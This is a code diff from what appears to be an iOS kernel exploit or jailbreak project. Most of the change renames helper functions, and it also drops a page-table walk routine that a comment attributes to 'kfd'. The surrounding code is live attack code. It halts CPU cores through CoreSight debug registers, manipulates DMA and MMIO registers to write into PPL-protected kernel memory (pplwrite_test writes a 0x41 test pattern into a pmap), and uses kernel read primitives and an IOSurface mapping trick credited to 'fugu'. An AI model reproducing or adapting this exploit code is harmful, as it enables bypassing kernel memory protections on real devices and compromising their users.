@@ -80,7 +80,7 @@
 #define DBGWRAP_DBGHALT          (1ULL << 31)
 #define DBGWRAP_DBGACK           (1ULL << 28)
 
-uint32_t sbox[] = {
+uint32_t sbox_[] = {
     0x007, 0x00B, 0x00D, 0x013, 0x00E, 0x015, 0x01F, 0x016,
     0x019, 0x023, 0x02F, 0x037, 0x04F, 0x01A, 0x025, 0x043,
     0x03B, 0x057, 0x08F, 0x01C, 0x026, 0x029, 0x03D, 0x045,
@@ -143,7 +143,7 @@ uint32_t calculate_ecc(const uint8_t* buffer) {
         uint32_t value = read_dword((uint64_t)buffer + pos);
         for (int j = 0; j < 32; ++j) {
             if (((value >> j) & 1) != 0) {
-                acc ^= sbox[32 * i + j];
+                acc ^= sbox_[32 * i + j];
             }
         }
     }
@@ -151,7 +151,7 @@ uint32_t calculate_ecc(const uint8_t* buffer) {
 }
 
 
-void dma_ctrl_1(uint64_t ctrl) {
+void dma_ctrl_1_(uint64_t ctrl) {
     
     
     uint64_t value = read_qword(ctrl);
@@ -164,7 +164,7 @@ void dma_ctrl_1(uint64_t ctrl) {
     }
 }
 
-void dma_ctrl_2(uint64_t ctrl,int flag) {
+void dma_ctrl_2_(uint64_t ctrl,int flag) {
     uint64_t value = read_qword(ctrl);
     printf("dma_ctrl_2 old value: %llx\n", value);
     if (flag) {
@@ -182,7 +182,7 @@ void dma_ctrl_2(uint64_t ctrl,int flag) {
     }
 }
 
-void dma_ctrl_3(uint64_t ctrl,uint64_t value) {
+void dma_ctrl_3_(uint64_t ctrl,uint64_t value) {
     value = value | 0x8000000000000000;
     uint64_t ctrl_value =read_qword(ctrl);
     printf("dma_ctrl_3 old value: %llx\n", ctrl_value);
@@ -195,21 +195,21 @@ void dma_ctrl_3(uint64_t ctrl,uint64_t value) {
 
 
 
-void dma_init(uint64_t base6140008, uint64_t base6140108, uint64_t original_value_0x206140108) {
-    dma_ctrl_1(base6140108);
-    dma_ctrl_2(base6140008,0);
-    dma_ctrl_3(base6140108,original_value_0x206140108);
+void dma_init_(uint64_t base6140008, uint64_t base6140108, uint64_t original_value_0x206140108) {
+    dma_ctrl_1_(base6140108);
+    dma_ctrl_2_(base6140008,0);
+    dma_ctrl_3_(base6140108,original_value_0x206140108);
 }
 
-void dma_done(uint64_t base6140008, uint64_t base6140108, uint64_t original_value_0x206140108) {
-    dma_ctrl_1(base6140108);
-    dma_ctrl_2(base6140008,1);
-    dma_ctrl_3(base6140108,original_value_0x206140108);
+void dma_done_(uint64_t base6140008, uint64_t base6140108, uint64_t original_value_0x206140108) {
+    dma_ctrl_1_(base6140108);
+    dma_ctrl_2_(base6140008,1);
+    dma_ctrl_3_(base6140108,original_value_0x206140108);
 }
 
 
 
-void ml_dbgwrap_halt_cpu(uint64_t coresight_base_utt) {
+void ml_dbgwrap_halt_cpu_(uint64_t coresight_base_utt) {
     uint64_t dbgWrapReg = read_qword(coresight_base_utt);
     printf("ml_dbgwrap_halt_cpu old value: %llx\n", dbgWrapReg);
     if ((dbgWrapReg & 0x90000000) != 0) return;
@@ -222,7 +222,7 @@ void ml_dbgwrap_halt_cpu(uint64_t coresight_base_utt) {
     }
 }
 
-void ml_dbgwrap_unhalt_cpu(uint64_t coresight_base_utt) {
+void ml_dbgwrap_unhalt_cpu_(uint64_t coresight_base_utt) {
     uint64_t dbgWrapReg = read_qword(coresight_base_utt);
     printf("ml_dbgwrap_unhalt_cpu curr value: %llx\n", dbgWrapReg);
     dbgWrapReg = (dbgWrapReg & 0xFFFFFFFF2FFFFFFF) | 0x40000000;
@@ -263,86 +263,7 @@ uint64_t phys_tokv(uint64_t pa)
     return pa - gPhysBase + gVirtBase;
 }
 
-//form kfd
-uint64_t v_tophys(uint64_t ttbr0_va_kaddr,uint64_t ttbr1_va_kaddr, uint64_t va)
-{
-    /*
-     * pmap stuff
-     */
-    
-    const uint64_t ROOT_LEVEL = PMAP_TT_L1_LEVEL;
-    const uint64_t LEAF_LEVEL = PMAP_TT_L3_LEVEL;
-    
-    uint64_t pa = 0;
-    uint64_t tt_kaddr = (va >> 63) ? ttbr1_va_kaddr : ttbr0_va_kaddr;
-    
-    for (uint64_t cur_level = ROOT_LEVEL; cur_level <= LEAF_LEVEL; cur_level++) {
-        uint64_t offmask, shift, index_mask, valid_mask, type_mask, type_block;
-        switch (cur_level) {
-            case PMAP_TT_L0_LEVEL: {
-                offmask = ARM_16K_TT_L0_OFFMASK;
-                shift = ARM_16K_TT_L0_SHIFT;
-                index_mask = ARM_16K_TT_L0_INDEX_MASK;
-                valid_mask = ARM_TTE_VALID;
-                type_mask = ARM_TTE_TYPE_MASK;
-                type_block = ARM_TTE_TYPE_BLOCK;
-                break;
-            }
-            case PMAP_TT_L1_LEVEL: {
-                offmask = ARM_16K_TT_L1_OFFMASK;
-                shift = ARM_16K_TT_L1_SHIFT;
-                index_mask = ARM_16K_TT_L1_INDEX_MASK;
-                valid_mask = ARM_TTE_VALID;
-                type_mask = ARM_TTE_TYPE_MASK;
-                type_block = ARM_TTE_TYPE_BLOCK;
-                break;
-            }
-            case PMAP_TT_L2_LEVEL: {
-                offmask = ARM_16K_TT_L2_OFFMASK;
-                shift = ARM_16K_TT_L2_SHIFT;
-                index_mask = ARM_16K_TT_L2_INDEX_MASK;
-                valid_mask = ARM_TTE_VALID;
-                type_mask = ARM_TTE_TYPE_MASK;
-                type_block = ARM_TTE_TYPE_BLOCK;
-                break;
-            }
-            case PMAP_TT_L3_LEVEL: {
-                offmask = ARM_16K_TT_L3_OFFMASK;
-                shift = ARM_16K_TT_L3_SHIFT;
-                index_mask = ARM_16K_TT_L3_INDEX_MASK;
-                valid_mask = ARM_PTE_TYPE_VALID;
-                type_mask = ARM_PTE_TYPE_MASK;
-                type_block = ARM_TTE_TYPE_L3BLOCK;
-                break;
-            }
-            default: {
-                printf("bad pmap tt level");
-                return 0;
-            }
-        }
-        
-        uint64_t tte_index = (va & index_mask) >> shift;
-        uint64_t tte_kaddr = tt_kaddr + (tte_index * sizeof(uint64_t));
-        uint64_t tte = 0;
-        do_kread(tte_kaddr, &tte, sizeof(tte));
-        
-        if ((tte & valid_mask) != valid_mask) {
-            return 0;
-        }
-        
-        if ((tte & type_mask) == type_block) {
-            pa = ((tte & ARM_TTE_PA_MASK & ~offmask) | (va & offmask));
-            break;
-        }
-        
-        tt_kaddr = phys_tokv(tte & ARM_TTE_TABLE_MASK);
-    }
-    
-    return pa;
-}
-
-
-mach_port_t IO_GetSurfacePort(uint64_t magic)
+mach_port_t IO_GetSurfacePort_(uint64_t magic)
 {
     IOSurfaceRef surfaceRef = IOSurfaceCreate((__bridge CFDictionaryRef)@{
         (__bridge NSString *)kIOSurfaceWidth : @120,
@@ -359,7 +280,7 @@ mach_port_t IO_GetSurfacePort(uint64_t magic)
 //form fugu
 uint64_t IO_GetMMAP(uint64_t phys, uint64_t size)
 {
-    mach_port_t surfaceMachPort = IO_GetSurfacePort(1337);
+    mach_port_t surfaceMachPort = IO_GetSurfacePort_(1337);
 //    uint64_t surface_port_addr = FindPortAddress(surfaceMachPort);
 //    uint64_t kobject =kread64(surface_port_addr + off_ip_kobject);
     uint64_t kobject = fun_ipc_entry_lookup(surfaceMachPort);
@@ -504,14 +425,14 @@ void  pplwrite_test(void)
         uint64_t base6150020 = base6150000+0x20;
         uint64_t base6150020_back = read_qword(base6150020);
         if (isa15a16) write_qword(base6150020,1); // a15 a16需要
-        ml_dbgwrap_halt_cpu(base6040000);
-        dma_init(base6140008,base6140108,original_value_0x206140108);
+        ml_dbgwrap_halt_cpu_(base6040000);
+        dma_init_(base6140008,base6140108,original_value_0x206140108);
         
         uint64_t test_p=pmap+0x50;
         write_data_with_mmio(test_p,base6150000,mask,i,0x4141414141414141);
         
-        dma_done(base6140008,base6140108,original_value_0x206140108);
-        ml_dbgwrap_unhalt_cpu(base6040000);
+        dma_done_(base6140008,base6140108,original_value_0x206140108);
+        ml_dbgwrap_unhalt_cpu_(base6040000);
         
         if (isa15a16) write_qword(base6150020,base6150020_back);
         uint64_t test= kread64(test_p);
